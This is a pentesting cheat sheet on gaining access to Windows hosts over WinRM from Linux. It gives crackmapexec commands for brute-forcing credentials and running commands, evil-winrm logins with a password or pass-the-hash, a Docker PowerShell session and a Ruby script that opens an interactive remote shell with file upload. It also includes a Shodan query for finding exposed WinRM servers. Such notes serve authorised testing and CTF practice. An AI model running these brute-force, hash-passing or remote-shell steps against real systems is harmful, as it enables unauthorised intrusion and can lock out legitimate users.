WinRM CONNECTION ON LINUX :

BRUTE FORCE :

Be careful, brute-forcing winrm could block users.

        #Brute force
        > crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt

        #Just check a pair of credentials
        # Username + Password + CMD command execution
        > crackmapexec winrm <IP> -d <Domain Name> -u <username> -p <password> -x "whoami"
        
        # Username + Hash + PS command execution
        > crackmapexec winrm <IP> -d <Domain Name> -u <username> -H <HASH> -X '$PSVersionTable'

        #Crackmapexec won't give you an interactive shell, but it will check if the creds are valid to access winrm



USING WinRM :

        > gem install evil-winrm

Read documentation on its github: "https://github.com/Hackplayers/evil-winrm"

        > evil-winrm -u Administrator -p 'EverybodyWantsToWorkAtP.O.O.'  -i <IP>/<Domain>

To use evil-winrm to connect to an IPv6 address create an entry inside /etc/hosts setting a domain name to the IPv6 address and connect to that domain.


PASS THE HASH WITH evil-winrm

        > evil-winrm -u <username> -H <Hash> -i <IP>



USING A PS-DOCKER MACHINE :

        > docker run -it quickbreach/powershell-ntlm
        > $creds = Get-Credential
        > Enter-PSSession -ComputerName 10.10.10.149 -Authentication Negotiate -Credential $creds



USING A RUBY SCRIPT :

Code extracted from here: https://alamot.github.io/winrm_shell/


------------------>>>

require 'winrm-fs'

# Author: Alamot
# To upload a file type: UPLOAD local_path remote_path
# e.g.: PS> UPLOAD myfile.txt C:\temp\myfile.txt


conn = WinRM::Connection.new( 
  endpoint: 'https://IP:PORT/wsman',
  transport: :ssl,
  user: 'username',
  password: 'password',
  :no_ssl_peer_verification => true
)


class String
  def tokenize
    self.
      split(/\s(?=(?:[^'"]|'[^']*'|"[^"]*")*$)/).
      select {|s| not s.empty? }.
      map {|s| s.gsub(/(^ +)|( +$)|(^["']+)|(["']+$)/,'')}
  end
end


command=""
file_manager = WinRM::FS::FileManager.new(conn)


conn.shell(:powershell) do |shell|
    until command == "exit\n" do
        output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")
        print(output.output.chomp)
        command = gets
        if command.start_with?('UPLOAD') then
            upload_command = command.tokenize
            print("Uploading " + upload_command[1] + " to " + upload_command[2])
            file_manager.upload(upload_command[1], upload_command[2]) do |bytes_copied, total_bytes, local_path, remote_path|
                puts("#{bytes_copied} bytes of #{total_bytes} bytes copied")
            end
            command = "echo `nOK`n"
        end
        output = shell.run(command) do |stdout, stderr|
            STDOUT.print(stdout)
            STDERR.print(stderr)
        end
    end    
    puts("Exiting with code #{output.exitcode}")
end

<<<-----------------------




SHODAN :

        > port:5985 Microsoft-HTTPAPI
        







